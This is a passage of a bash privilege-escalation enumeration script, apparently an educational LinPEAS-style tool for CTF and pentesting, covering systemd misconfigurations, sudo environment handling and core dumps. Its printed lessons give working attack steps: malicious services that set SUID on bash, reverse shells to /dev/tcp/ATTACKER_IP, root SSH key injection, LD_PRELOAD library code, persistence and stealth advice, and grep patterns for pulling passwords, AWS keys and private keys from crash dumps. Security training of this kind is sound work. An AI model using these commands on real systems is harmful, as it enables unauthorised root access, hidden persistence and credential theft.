        teach "║  SYSTEMD - Understanding Modern Linux Service Management     ║"
        teach "╚═══════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT IS SYSTEMD:"
        teach "  Modern Linux init system (replaced SysV init ~2015+)"
        teach "  Manages: services, timers, sockets, mounts, devices"
        teach "  Runs as PID 1 with root privileges"
        teach ""
        teach "KEY ATTACK SURFACES:"
        teach "  • .service files → Define WHAT runs and HOW"
        teach "  • .timer files → Define WHEN services run"
        teach "  • ExecStart= → The actual command executed"
        teach "  • User= directive → Who runs it (empty = root)"
        teach "  • EnvironmentFile= → Variables loaded before execution"
        teach ""
        teach "WHY MISCONFIGURATIONS HAPPEN:"
        teach "  1. Quick deployments → 'Just make it work'"
        teach "  2. Convenience over security → Scripts in /home with 777"
        teach "  3. Copy-paste configs → Don't understand what they're doing"
        teach "  4. Forgotten after setup → 'Set it and forget it' mentality"
        teach ""
        teach "EXPLOITATION CHAIN:"
        teach "  Systemd (root, PID 1) → Reads .service file → Executes ExecStart="
        teach "  If you control ANY part of this chain → You control root execution"
        log ""
    fi
    
    # === PHASE 3: REPORT SPECIFIC FINDINGS (BATCHED) ===
    
    # Report writable service directories
    if [ -s "$temp_writable_dirs" ]; then
        critical "WRITABLE SYSTEMD DIRECTORIES - Create malicious services"
        log ""
        
        while IFS= read -r service_dir; do
            critical "  → $service_dir"
        done < "$temp_writable_dirs"
        
        log ""
        teach "╔═══════════════════════════════════════════════════════════════╗"
        teach "║  INSTANT ROOT: Writable Service Directory                    ║"
        teach "╚═══════════════════════════════════════════════════════════════╝"
        teach ""
        teach "IMPACT: Total control. Create any service you want."
        teach ""
        teach "EXPLOITATION:"
        teach "  # Pick writable directory from above"
        teach "  DIR=/etc/systemd/system  # or whichever is writable"
        teach ""
        teach "  # Create malicious service"
        teach "  cat > \$DIR/pwn.service << 'EOF'"
        teach "  [Unit]"
        teach "  Description=System Optimizer"
        teach "  "
        teach "  [Service]"
        teach "  Type=oneshot"
        teach "  ExecStart=/bin/bash -c 'chmod u+s /bin/bash'"
        teach "  "
        teach "  [Install]"
        teach "  WantedBy=multi-user.target"
        teach "  EOF"
        teach ""
        teach "  # Execute"
        teach "  systemctl daemon-reload"
        teach "  systemctl start pwn.service"
        teach "  /bin/bash -p  # Root shell"
        teach ""
        teach "ALTERNATIVE PAYLOADS:"
        teach "  Reverse shell:"
        teach "    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
        teach ""
        teach "  SSH key:"
        teach "    ExecStart=/bin/bash -c 'mkdir -p /root/.ssh && echo YOUR_KEY >> /root/.ssh/authorized_keys'"
        teach ""
        teach "  Persistence (runs on boot):"
        teach "    Add: WantedBy=multi-user.target to [Install]"
        teach "    Then: systemctl enable pwn.service"
        log ""
    fi
    
    # Report writable service files (BATCHED)
    if [ -s "$temp_writable_services" ]; then
        critical "WRITABLE SERVICE FILES - Modify ExecStart= for root execution"
        log ""
        
        local root_count=0
        local user_count=0
        
        while IFS='|' read -r service_file user service_name; do
            if [ "$user" = "root" ]; then
                critical "  → $service_name (root)"
                info "     $service_file"
                root_count=$((root_count + 1))
            else
                warn "  → $service_name (user: $user)"
                info "     $service_file"
                user_count=$((user_count + 1))
            fi
        done < "$temp_writable_services"
        
        log ""
        if [ $root_count -gt 0 ]; then
            teach "╔═══════════════════════════════════════════════════════════════╗"
            teach "║  HIGH IMPACT: Direct Service File Modification               ║"
            teach "╚═══════════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT YOU CONTROL: The service definition itself"
            teach ""
            teach "EXPLOITATION (Choose a service from above):"
            teach "  SERVICE=/path/to/writable.service  # Pick one above"
            teach "  SERVICE_NAME=\$(basename \$SERVICE)"
            teach ""
            teach "  # Method 1: Replace ExecStart"
            teach "  cp \$SERVICE \${SERVICE}.bak  # Backup"
            teach "  sed -i 's|^ExecStart=.*|ExecStart=/bin/bash -c \"chmod u+s /bin/bash\"|' \$SERVICE"
            teach "  systemctl daemon-reload"
            teach "  systemctl restart \$SERVICE_NAME"
            teach "  /bin/bash -p"
            teach ""
            teach "  # Method 2: Prepend with ExecStartPre (stealthier)"
            teach "  sed -i '/^ExecStart=/i ExecStartPre=/bin/bash -c \"chmod u+s /bin/bash\"' \$SERVICE"
            teach "  systemctl daemon-reload && systemctl restart \$SERVICE_NAME"
            teach "  # Original service still works = less suspicious"
            teach ""
            teach "TIMING:"
            teach "  • If service running → restart triggers immediately"
            teach "  • If service stopped → need to start manually OR wait for trigger"
            teach "  • If timer exists → waits for scheduled time"
            teach "  • Check status: systemctl status SERVICE_NAME"
            log ""
        fi
        
        if [ $user_count -gt 0 ]; then
            warn "Note: Services running as non-root users listed above"
            info "      Less useful but can still escalate via those user accounts"
            log ""
        fi
    fi
    
    # Report writable ExecStart scripts (BATCHED)
    if [ -s "$temp_writable_scripts" ]; then
        critical "WRITABLE EXECSTART SCRIPTS - Replace with malicious code"
        log ""
        
        while IFS='|' read -r service_name service_file script_path; do
            critical "  → $script_path"
            info "     Service: $service_name"
        done < "$temp_writable_scripts"
        
        log ""
        teach "╔═══════════════════════════════════════════════════════════════╗"
        teach "║  SCRIPT HIJACKING: Service File Secure, Script Is Not        ║"
        teach "╚═══════════════════════════════════════════════════════════════╝"
        teach ""
        teach "SCENARIO: Service file protected, but ExecStart script isn't"
        teach ""
        teach "EXPLOITATION (Pick a script from above):"
        teach "  SCRIPT=/path/to/writable/script.sh  # Pick one"
        teach "  SERVICE_NAME=service_name  # Match it to the service"
        teach ""
        teach "  # Method 1: Prepend payload (keeps functionality)"
        teach "  cp \$SCRIPT \${SCRIPT}.bak"
        teach "  cat > /tmp/new << 'EOF'"
        teach "  #!/bin/bash"
        teach "  chmod u+s /bin/bash  # Your payload"
        teach "  EOF"
        teach "  cat \$SCRIPT >> /tmp/new"
        teach "  mv /tmp/new \$SCRIPT"
        teach "  chmod +x \$SCRIPT"
        teach "  systemctl restart \$SERVICE_NAME"
        teach ""
        teach "  # Method 2: Complete replacement (faster)"
        teach "  cat > \$SCRIPT << 'EOF'"
        teach "  #!/bin/bash"
        teach "  chmod u+s /bin/bash"
        teach "  EOF"
        teach "  chmod +x \$SCRIPT"
        teach "  systemctl restart \$SERVICE_NAME"
        teach ""
        teach "  # Method 3: Reverse shell"
        teach "  cat > \$SCRIPT << 'EOF'"
        teach "  #!/bin/bash"
        teach "  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
        teach "  EOF"
        teach "  chmod +x \$SCRIPT"
        teach "  # On attacker: nc -lvnp 4444"
        teach "  systemctl restart \$SERVICE_NAME"
        log ""
    fi
    
    # Report writable timers (BATCHED)
    if [ -s "$temp_writable_timers" ]; then
        critical "WRITABLE SYSTEMD TIMERS - Scheduled privilege escalation"
        log ""
        
        while IFS='|' read -r timer_file service_name schedule; do
            critical "  → $(basename $timer_file)"
            info "     Triggers: $service_name"
            [ -n "$schedule" ] && info "     Schedule: $schedule"
        done < "$temp_writable_timers"
        
        log ""
        teach "╔═══════════════════════════════════════════════════════════════╗"
        teach "║  TIMER EXPLOITATION: Automated Privilege Escalation          ║"
        teach "╚═══════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT ARE TIMERS: Systemd's replacement for cron"
        teach "  OnCalendar=daily → Once per day"
        teach "  OnCalendar=*:0/10 → Every 10 minutes"
        teach "  OnBootSec=5min → 5 min after boot"
        teach ""
        teach "EXPLOITATION PATHS:"
        teach ""
        teach "  Path 1: Modify timer to trigger immediately"
        teach "    TIMER=/path/to/writable.timer  # Pick from above"
        teach "    sed -i 's/^OnCalendar=.*/OnBootSec=1sec/' \$TIMER"
        teach "    sed -i 's/^OnBootSec=.*/OnBootSec=1sec/' \$TIMER"
        teach "    systemctl daemon-reload"
        teach "    systemctl start \$(basename \$TIMER)"
        teach ""
        teach "  Path 2: Point timer to YOUR malicious service"
        teach "    # Create malicious service"
        teach "    cat > /tmp/pwn.service << 'EOF'"
        teach "    [Service]"
        teach "    ExecStart=/bin/bash -c 'chmod u+s /bin/bash'"
        teach "    EOF"
        teach "    "
        teach "    # Hijack timer"
        teach "    sed -i 's|^Unit=.*|Unit=/tmp/pwn.service|' \$TIMER"
        teach "    systemctl daemon-reload"
        teach "    systemctl start \$(basename \$TIMER)"
        teach ""
        teach "  Path 3: Modify the service that timer triggers"
        teach "    # Find service: grep Unit= /path/to/timer"
        teach "    # Then use service exploitation techniques above"
        teach ""
        teach "WHY TIMERS ARE VALUABLE:"
        teach "  • Auto-trigger (no manual restart needed)"
        teach "  • Persistent (survives after you lose shell)"
        teach "  • Often forgotten by admins"
        log ""
    fi
    
    # Report relative paths (BATCHED - only suspicious ones now)
    if [ -s "$temp_relative_paths" ]; then
        warn "SUSPICIOUS RELATIVE PATHS IN SERVICES"
        log ""
        
        local notfound_count=0
        local writable_count=0
        
        while IFS='|' read -r service_file exec_cmd binary status; do
            if [[ "$status" == "NOTFOUND" ]]; then
                warn "  → Binary NOT FOUND: $binary"
                info "     Service: $(basename $service_file)"
                info "     Command: $exec_cmd"
                notfound_count=$((notfound_count + 1))
            elif [[ "$status" == WRITABLE:* ]]; then
                local path="${status#WRITABLE:}"
                critical "  → Binary is WRITABLE: $binary"
                info "     Location: $path"
                info "     Service: $(basename $service_file)"
                writable_count=$((writable_count + 1))
            fi
        done < "$temp_relative_paths"
        
        log ""
        if [ $writable_count -gt 0 ] || [ $notfound_count -gt 0 ]; then
            teach "╔═══════════════════════════════════════════════════════════════╗"
            teach "║  PATH HIJACKING: Non-Standard Binary Exploitation            ║"
            teach "╚═══════════════════════════════════════════════════════════════╝"
            teach ""
            
            if [ $writable_count -gt 0 ]; then
                teach "WRITABLE BINARIES FOUND:"
                teach "  The binary itself is writable → Direct replacement attack"
                teach ""
                teach "  EXPLOIT:"
                teach "    BINARY=/path/to/writable/binary  # From above"
                teach "    cp \$BINARY \${BINARY}.bak"
                teach "    cat > \$BINARY << 'EOF'"
                teach "    #!/bin/bash"
                teach "    chmod u+s /bin/bash"
                teach "    EOF"
                teach "    chmod +x \$BINARY"
                teach "    # Wait for service to run OR systemctl restart SERVICE"
                teach ""
            fi
            
            if [ $notfound_count -gt 0 ]; then
                teach "BINARIES NOT FOUND IN PATH:"
                teach "  Service expects binary but it doesn't exist"
                teach "  → Create it in a PATH directory"
                teach ""
                teach "  EXPLOIT:"
                teach "    # Check writable PATH dirs"
                teach "    echo \$PATH | tr ':' '\\n' | while read dir; do"
                teach "      [ -w \"\$dir\" ] && echo \"Writable: \$dir\""
                teach "    done"
                teach ""
                teach "    # Create malicious binary"
                teach "    cat > /writable/path/dir/BINARY_NAME << 'EOF'"
                teach "    #!/bin/bash"
                teach "    chmod u+s /bin/bash"
                teach "    EOF"
                teach "    chmod +x /writable/path/dir/BINARY_NAME"
                teach ""
            fi
            
            teach "NOTE: Standard systemd binaries (systemctl, journalctl, etc.)"
            teach "      are NOT vulnerable to PATH hijacking and have been filtered"
            log ""
        fi
    fi
    
    # Report services with auto-restart (BATCHED)
    if [ -s "$temp_restart_services" ]; then
        info "SERVICES WITH AUTO-RESTART (Restart=always):"
        log ""
        
        local count=0
        while IFS='|' read -r service_file service_name; do
            count=$((count + 1))
            [ $count -le 10 ] && info "  • $service_name"
        done < "$temp_restart_services"
        
        local total=$(wc -l < "$temp_restart_services")
        if [ $total -gt 10 ]; then
            info "  ... and $((total - 10)) more"
        fi
        
        log ""
        teach "AUTO-RESTART EXPLOITATION:"
        teach "  Restart=always → Service auto-restarts on crash"
        teach ""
        teach "  EXPLOITATION IDEA:"
        teach "    1. Modify service/script to run payload then crash"
        teach "    2. Service crashes"
        teach "    3. Systemd auto-restarts it"
        teach "    4. Payload runs again"
        teach "    5. Persistent exploitation"
        teach ""
        teach "  EXAMPLE:"
        teach "    # Modify service ExecStart to:"
        teach "    ExecStart=/bin/bash -c 'chmod u+s /bin/bash; exit 1'"
        teach "    # Exits with error → systemd restarts → payload runs repeatedly"
        log ""
    fi
    
    # Report writable environment files (BATCHED)
    if [ -s "$temp_env_files" ]; then
        critical "WRITABLE ENVIRONMENT FILES - Variable injection attack"
        log ""
        
        while IFS='|' read -r service_file service_name env_file; do
            critical "  → $env_file"
            info "     Service: $service_name"
        done < "$temp_env_files"
        
        log ""
        teach "╔═══════════════════════════════════════════════════════════════╗"
        teach "║  ENVIRONMENT FILE EXPLOITATION                                ║"
        teach "╚═══════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT ARE ENVIRONMENT FILES:"
        teach "  Services load variables from files before execution"
        teach "  Example: EnvironmentFile=/etc/default/myapp"
        teach "  Service then uses: ExecStart=/usr/bin/myapp \$OPTIONS"
        teach ""
        teach "EXPLOITATION VECTORS:"
        teach ""
        teach "  Vector 1: Command injection via variable"
        teach "    ENV_FILE=/path/to/writable/envfile  # From above"
        teach "    echo 'OPTIONS=; chmod u+s /bin/bash #' >> \$ENV_FILE"
        teach "    systemctl restart SERVICE_NAME"
        teach "    # If service uses \$OPTIONS in command, injection succeeds"
        teach ""
        teach "  Vector 2: LD_PRELOAD hijacking"
        teach "    # Create malicious library"
        teach "    cat > /tmp/evil.c << 'EOF'"
        teach "    #include <stdlib.h>"
        teach "    #include <unistd.h>"
        teach "    void _init() {"
        teach "        setuid(0); setgid(0);"
        teach "        system(\"/bin/bash -p\");"
        teach "    }"
        teach "    EOF"
        teach "    gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c"
        teach "    "
        teach "    # Inject into environment"
        teach "    echo 'LD_PRELOAD=/tmp/evil.so' >> \$ENV_FILE"
        teach "    systemctl restart SERVICE_NAME"
        teach ""
        teach "  Vector 3: PATH hijacking"
        teach "    echo 'PATH=/tmp:\$PATH' >> \$ENV_FILE"
        teach "    # Create malicious binary in /tmp"
        teach "    # Named same as binary service calls"
        teach "    systemctl restart SERVICE_NAME"
        teach ""
        teach "WHY THIS WORKS:"
        teach "  • Environment loaded BEFORE ExecStart runs"
        teach "  • Variables expand during execution"
        teach "  • LD_PRELOAD loaded before any library"
        teach "  • PATH searched left-to-right"
        log ""
    fi
    
    # === PHASE 4: CLEAN SUMMARY ===
    if [ $found_issues -eq 0 ]; then
        ok "No exploitable systemd misconfigurations found"
        log ""
        teach "WHAT WAS CHECKED:"
        teach "  ✓ Writable service directories"
        teach "  ✓ Writable .service files"
        teach "  ✓ Writable ExecStart scripts"
        teach "  ✓ Writable .timer files"
        teach "  ✓ Suspicious relative paths in ExecStart"
        teach "  ✓ Writable EnvironmentFiles"
        teach "  ✓ Services with auto-restart capability"
        log ""
        teach "YOUR SYSTEMD CONFIGURATION APPEARS SECURE"
        log ""
        teach "Note: Standard system binaries (systemctl, journalctl, udevadm, etc.)"
        teach "      use relative paths by design but are NOT exploitable via PATH"
        teach "      hijacking. These have been filtered from results."
    else
        log ""
        teach "═════════════════════════════════════════════════════════════════"
        teach "SYSTEMD EXPLOITATION SUMMARY"
        teach "═════════════════════════════════════════════════════════════════"
        teach ""
        teach "EXPLOITATION PRIORITY (High → Low):"
        teach "  1. Writable service directories → Create new services"
        teach "  2. Writable .service files → Modify ExecStart= directly"
        teach "  3. Writable ExecStart scripts → Replace with payload"
        teach "  4. Writable EnvironmentFiles → Inject LD_PRELOAD/PATH"
        teach "  5. Writable .timer files → Modify schedule + service"
        teach "  6. Writable binaries → Direct replacement"
        teach ""
        teach "ESSENTIAL COMMANDS:"
        teach "  systemctl daemon-reload      # Reload after file changes"
        teach "  systemctl start SERVICE      # Trigger immediately"
        teach "  systemctl restart SERVICE    # Stop then start"
        teach "  systemctl status SERVICE     # Check current state"
        teach "  systemctl is-enabled SERVICE # Check boot persistence"
        teach "  systemctl list-timers        # View all scheduled timers"
        teach "  journalctl -u SERVICE -n 50  # Recent logs"
        teach ""
        teach "STEALTH CONSIDERATIONS:"
        teach "  • Backup original files before modification"
        teach "  • Use ExecStartPre to preserve functionality"
        teach "  • Monitor logs for failures (journalctl)"
        teach "  • Restore originals after exploitation"
        teach "  • Test in dev environment first"
        teach ""
        teach "PERSISTENCE TIPS:"
        teach "  • Add WantedBy=multi-user.target to [Install]"
        teach "  • Run: systemctl enable SERVICE"
        teach "  • Service now starts on boot"
        teach "  • Survives reboots and shell loss"
        teach ""
        teach "WHY SYSTEMD MATTERS FOR CTF/PENTESTING:"
        teach "  • Present on 95%+ modern Linux (Ubuntu 15.04+, Debian 8+, etc.)"
        teach "  • Often misconfigured during quick deployments"
        teach "  • Multiple exploitation vectors"
        teach "  • Provides reliable persistence"
        teach "  • Less familiar to defenders than cron"
        log ""
    fi
}
# === ENVIRONMENT VARIABLES ===
enum_env() {
    section "ENVIRONMENT VARIABLE ANALYSIS"
    
    explain_concept "Environment Variables" \
        "Environment variables can influence program behavior. LD_PRELOAD, LD_LIBRARY_PATH, and PYTHONPATH can be exploited if preserved through sudo." \
        "Programs load libraries at runtime. LD_PRELOAD forces a library to load first. If sudo preserves this variable (env_keep+=LD_PRELOAD), you can inject code into any sudo command." \
        "Exploitation:\n  1. Create malicious library with init function\n  2. Compile: gcc -shared -fPIC -o evil.so evil.c\n  3. Set: export LD_PRELOAD=/tmp/evil.so\n  4. Run: sudo <any command>\n  5. Your library's code runs as root"
    
    # Check current environment
    if env | grep -i "LD_PRELOAD\|LD_LIBRARY_PATH" | grep -qv "^$"; then
        warn "LD_* variables are set in environment:"
        env | grep -i "LD_PRELOAD\|LD_LIBRARY_PATH"
    fi
    
    # Check if sudo preserves env
    if sudo -l 2>/dev/null | grep -q "env_keep.*LD_PRELOAD"; then
        critical "Sudo preserves LD_PRELOAD - Inject malicious library for instant root"
        vuln "Sudo preserves LD_PRELOAD!"
        teach "Create malicious shared library and execute with any sudo command"
    fi
    
    info "Sudo permissions detected:"
    echo "$sudo_output" | while read line; do
        log "  $line"
    done
    log ""
    
    if sudo -l 2>/dev/null | grep -q "env_keep.*LD_LIBRARY_PATH"; then
        vuln "Sudo preserves LD_LIBRARY_PATH!"
        teach "Similar to LD_PRELOAD but points to directory containing evil library"
    fi
}
# === CORE DUMP ANALYSIS ===
enum_core_dumps() {
    section "CORE DUMP ANALYSIS"
    
    # === PHASE 1: SILENT SCAN - Collect all findings ===
    local temp_core_files="/tmp/.learnpeas_core_files_$$"
    local temp_readable_crashes="/tmp/.learnpeas_crashes_$$"
    local temp_core_pattern="/tmp/.learnpeas_core_pattern_$$"
    local found_issues=0
    
    cleanup_core_temps() {
        rm -f "$temp_core_files" "$temp_readable_crashes" "$temp_core_pattern" 2>/dev/null
    }
    trap cleanup_core_temps RETURN
    
    # Check if core dumping is enabled
    local ulimit_core=$(ulimit -c 2>/dev/null)
    local core_enabled=0
    
    if [ "$ulimit_core" != "0" ]; then
        core_enabled=1
        echo "$ulimit_core" >> "$temp_core_pattern"
        found_issues=1
    fi
    
    # Check core_pattern (where cores are written)
    if [ -r /proc/sys/kernel/core_pattern ]; then
        local core_pattern=$(cat /proc/sys/kernel/core_pattern 2>/dev/null)
        if [ -n "$core_pattern" ] && [ "$core_pattern" != "core" ]; then
            echo "$core_pattern" >> "$temp_core_pattern"
        fi
    fi
    
    # Check /var/crash/ (Ubuntu/Debian crash dumps)
    if [ -d /var/crash ]; then
        find /var/crash -type f -readable 2>/dev/null | while read crash; do
            # Skip if it's just a lock file
            echo "$crash" | grep -q "\.lock$" && continue
            
            local size=$(stat -c%s "$crash" 2>/dev/null)
            # Only flag files > 1KB (actual crash dumps, not metadata)
            if [ "$size" -gt 1024 ]; then
                echo "$crash|$size" >> "$temp_readable_crashes"
                found_issues=1
            fi
        done
    fi
    
    # Search for core files in common locations
    local core_locations=("/tmp" "/var/tmp" "/var/log" "/home" "/root" ".")
    
    for location in "${core_locations[@]}"; do
        [ ! -d "$location" ] && continue
        
        # Find core files (core, core.PID, or *.core)
        find "$location" -maxdepth 2 -type f \( -name "core" -o -name "core.*" -o -name "*.core" \) -readable 2>/dev/null | while read corefile; do
            # Skip if it's a directory or zero-size
            [ ! -f "$corefile" ] && continue
            local size=$(stat -c%s "$corefile" 2>/dev/null)
            [ "$size" -eq 0 ] && continue
            
            echo "$corefile|$size|$location" >> "$temp_core_files"
            found_issues=1
        done
    done
    
    # === PHASE 2: CONDITIONAL EDUCATION (only if issues found) ===
    if [ $found_issues -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  CORE DUMPS - Memory Snapshots with Plaintext Secrets"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT ARE CORE DUMPS:"
        teach "  When a program crashes, Linux can save its entire memory"
        teach "  to disk as a 'core dump' file. This file contains:"
        teach "  • All variables (including passwords in plaintext)"
        teach "  • Command-line arguments"
        teach "  • Environment variables"
        teach "  • Network connection data"
        teach "  • Decrypted keys from memory"
        teach ""
        teach "HOW CORE DUMPS HAPPEN:"
        teach "  1. Program crashes (segfault, abort, etc.)"
        teach "  2. Kernel captures the entire process memory"
        teach "  3. Writes memory dump to disk"
        teach "  4. File location determined by core_pattern"
        teach "  5. Memory snapshot preserved forever"
        teach ""
        teach "WHY THEY CONTAIN SECRETS:"
        teach ""
        teach "  Scenario 1 - Database Credentials:"
        teach "    mysql -u root -p'SecretPass123' database"
        teach "    MySQL crashes → Core dump created"
        teach "    Password 'SecretPass123' is in memory → In core file"
        teach ""
        teach "  Scenario 2 - SSH Private Keys:"
        teach "    ssh-agent loads your private key into memory"
        teach "    ssh-agent crashes → Private key dumped to disk"
        teach "    Key was encrypted, but now plaintext in core"
        teach ""
        teach "  Scenario 3 - Web Application Secrets:"
        teach "    Apache/Nginx worker processes handle requests"
        teach "    Request contains: Authorization: Bearer TOKEN123"
        teach "    Worker crashes → TOKEN123 in core dump"
        teach ""
        teach "  Scenario 4 - Sudo Password:"
        teach "    User types password for sudo command"
        teach "    Password stored in memory (for 15-min cache)"
        teach "    Program crashes → Password in core dump"
        teach ""
        teach "WHY CORE DUMPS ARE DANGEROUS:"
        teach "  • Passwords stored encrypted in /etc/shadow"
        teach "  • But core dumps contain PLAINTEXT from memory"
        teach "  • Files persist forever (until manually deleted)"
        teach "  • Often world-readable or group-readable"
        teach "  • Forgotten by admins (out of sight, out of mind)"
        teach ""
        teach "CORE DUMP CONFIGURATION:"
        teach ""
        teach "  ulimit -c:"
        teach "    Controls max core dump size"
        teach "    ulimit -c 0         → Core dumps disabled"
        teach "    ulimit -c unlimited → Core dumps enabled (any size)"
        teach "    ulimit -c 1024      → Max 1MB core dumps"
        teach ""
        teach "  /proc/sys/kernel/core_pattern:"
        teach "    Controls WHERE and HOW cores are written"
        teach "    'core'              → Write to current directory as 'core'"
        teach "    'core.%p'           → Include PID: core.12345"
        teach "    '/var/crash/core.%p' → Centralized crash directory"
        teach "    '|/usr/share/apport/apport' → Pipe to crash handler"
        teach ""
        teach "WHY ADMINS ENABLE CORE DUMPS:"
        teach "  • Debugging production issues"
        teach "  • Troubleshooting crashes"
        teach "  • Post-mortem analysis"
        teach "  • 'We'll disable it later' (narrator: they didn't)"
        log ""
    fi
    
    # === PHASE 3: REPORT SPECIFIC FINDINGS ===
    
    # Report if core dumping is enabled
    if [ -s "$temp_core_pattern" ]; then
        if [ $core_enabled -eq 1 ]; then
            warn "Core dumping is ENABLED - Crashes will save memory to disk"
            log ""
            info "Current ulimit: $ulimit_core"
            
            if [ -r /proc/sys/kernel/core_pattern ]; then
                local pattern=$(cat /proc/sys/kernel/core_pattern 2>/dev/null)
                info "Core pattern: $pattern"
                
                # Decode the pattern
                case "$pattern" in
                    core)
                        info "  → Cores written to current directory as 'core'"
                        ;;
                    core.*)
                        info "  → Cores written to current directory with PID/pattern"
                        ;;
                    /*)
                        info "  → Cores written to: $(dirname "$pattern")"
                        ;;
                    \|*)
                        local handler=$(echo "$pattern" | sed 's/^|//' | awk '{print $1}')
                        info "  → Cores piped to crash handler: $handler"
                        ;;
                esac
            fi
            
            log ""
            teach "IMPLICATIONS:"
            teach "  Any program crash will create memory dump"
            teach "  Dumps may contain plaintext passwords and keys"
            teach "  Check for existing dumps that you can read"
        fi
    fi
    
    # Report readable crash dumps in /var/crash
    if [ -s "$temp_readable_crashes" ]; then
        critical "READABLE CRASH DUMPS - Memory snapshots with potential credentials"
        log ""
        
        while IFS='|' read -r crash size; do
            vuln "Readable crash dump: $crash"
            info "  Size: $(numfmt --to=iec-i --suffix=B $size 2>/dev/null || echo "${size} bytes")"
        done < "$temp_readable_crashes"
        
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  /var/crash EXPLOITATION"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT IS /var/crash:"
        teach "  Ubuntu/Debian systems use 'apport' to collect crash reports."
        teach "  When programs crash, apport saves:"
        teach "  • Core dump (memory snapshot)"
        teach "  • Stack trace"
        teach "  • System information"
        teach "  • Open files list"
        teach ""
        teach "FILE FORMATS:"
        teach "  .crash files → Compressed crash reports (apport format)"
        teach "  .core files  → Raw core dumps"
        teach "  .uploaded    → Marker that crash was sent to Ubuntu"
        teach ""
        teach "EXPLOITATION:"
        teach ""
        teach "  Step 1 - List crash dumps:"
        teach "    ls -lah /var/crash/"
        teach ""
        teach "  Step 2 - Check file type:"
        teach "    file /var/crash/program.crash"
        teach ""
        teach "  Step 3 - Extract readable strings:"
        teach "    strings /var/crash/program.crash | grep -i password"
        teach "    strings /var/crash/program.crash | grep -i 'api.key'"
        teach "    strings /var/crash/program.crash | grep -E '^[A-Za-z0-9+/]{20,}={0,2}\$'"
        teach ""
        teach "  Step 4 - Search for common patterns:"
        teach "    # Database credentials"
        teach "    strings /var/crash/program.crash | grep -E 'mysql://|postgres://|mongodb://'"
        teach ""
        teach "    # SSH keys (look for key headers)"
        teach "    strings /var/crash/program.crash | grep -A 20 'BEGIN.*PRIVATE KEY'"
        teach ""
        teach "    # Environment variables"
        teach "    strings /var/crash/program.crash | grep -E 'PASSWORD=|SECRET=|TOKEN='"
        teach ""
        teach "    # URLs with credentials"
        teach "    strings /var/crash/program.crash | grep -E 'https?://[^:]+:[^@]+@'"
        teach ""
        teach "  Step 5 - If .crash file is gzip compressed:"
        teach "    gunzip -c /var/crash/program.crash > /tmp/dump"
        teach "    strings /tmp/dump | grep -i password"
        teach ""
        teach "  Step 6 - Use apport-unpack (if available):"
        teach "    mkdir /tmp/crash-extract"
        teach "    apport-unpack /var/crash/program.crash /tmp/crash-extract"
        teach "    strings /tmp/crash-extract/CoreDump | grep -i password"
        teach ""
        teach "TARGETED SEARCH PATTERNS:"
        teach ""
        teach "  MySQL/MariaDB:"
        teach "    strings crash.file | grep -E 'mysql -u|--password='"
        teach ""
        teach "  PostgreSQL:"
        teach "    strings crash.file | grep -E 'PGPASSWORD=|psql.*password'"
        teach ""
        teach "  AWS Credentials:"
        teach "    strings crash.file | grep -E 'AKIA[0-9A-Z]{16}|aws_secret_access_key'"
        teach ""
        teach "  Private Keys:"
        teach "    strings crash.file | grep -B2 -A20 'BEGIN.*PRIVATE KEY'"
        teach ""
        teach "  JWT Tokens:"
        teach "    strings crash.file | grep -E 'eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+'"
        teach ""
        teach "  API Keys (generic):"
        teach "    strings crash.file | grep -iE 'api.key|apikey|api_key' | grep -v '\\[' | head -20"
        log ""
    fi
    
    # Report core files found in various locations
    if [ -s "$temp_core_files" ]; then
        critical "CORE DUMP FILES FOUND - Memory snapshots readable"
        log ""
        
        # Group by location for better readability
        local prev_location=""
        while IFS='|' read -r corefile size location; do
            if [ "$location" != "$prev_location" ]; then
                log ""
                info "Location: $location"
                prev_location="$location"
            fi
            vuln "  Core dump: $corefile"
            info "    Size: $(numfmt --to=iec-i --suffix=B $size 2>/dev/null || echo "${size} bytes")"
        done < "$temp_core_files"
        
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  CORE FILE EXPLOITATION"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT ARE CORE FILES:"
        teach "  Raw memory dumps from crashed programs."
        teach "  Usually named: core, core.1234, program.core"
        teach ""
        teach "BASIC ANALYSIS:"
        teach ""
        teach "  Step 1 - Identify which program crashed:"
        teach "    file core"
        teach "    # Output: core: ELF 64-bit LSB core file, x86-64, from 'apache2'"
        teach ""
        teach "  Step 2 - Extract all readable strings:"
        teach "    strings core > core_strings.txt"
        teach "    # Creates text file with all printable strings"
        teach ""
        teach "  Step 3 - Search for sensitive data:"
        teach "    grep -i password core_strings.txt"
        teach "    grep -i secret core_strings.txt"
        teach "    grep -i api core_strings.txt"
        teach "    grep -i token core_strings.txt"
        teach "    grep -i key core_strings.txt"
        teach ""
        teach "ADVANCED ANALYSIS WITH GDB:"
        teach ""
        teach "  If you have gdb and the binary that crashed:"
        teach ""
        teach "  Step 1 - Load core dump in gdb:"
        teach "    gdb /usr/bin/crashed-program core"
        teach ""
        teach "  Step 2 - Examine backtrace (see what was running):"
        teach "    (gdb) bt"
        teach "    # Shows call stack at time of crash"
        teach ""
        teach "  Step 3 - Examine memory regions:"
        teach "    (gdb) info proc mappings"
        teach "    # Shows all memory regions"
        teach ""
        teach "  Step 4 - Search memory for strings:"
        teach "    (gdb) find &__libc_start_main, +999999999, \"password\""
        teach "    # Searches memory for the word 'password'"
        teach ""
        teach "  Step 5 - Dump specific memory regions:"
        teach "    (gdb) dump memory /tmp/heap.bin 0x7ffff7a00000 0x7ffff7b00000"
        teach "    # Dumps memory range to file"
        teach "    strings /tmp/heap.bin | grep -i password"
        teach ""
        teach "QUICK WINS - One-Liners:"
        teach ""
        teach "  Find all passwords in core:"
        teach "    strings core | grep -i password | grep -v 'password:' | head -20"
        teach ""
        teach "  Find SSH private keys:"
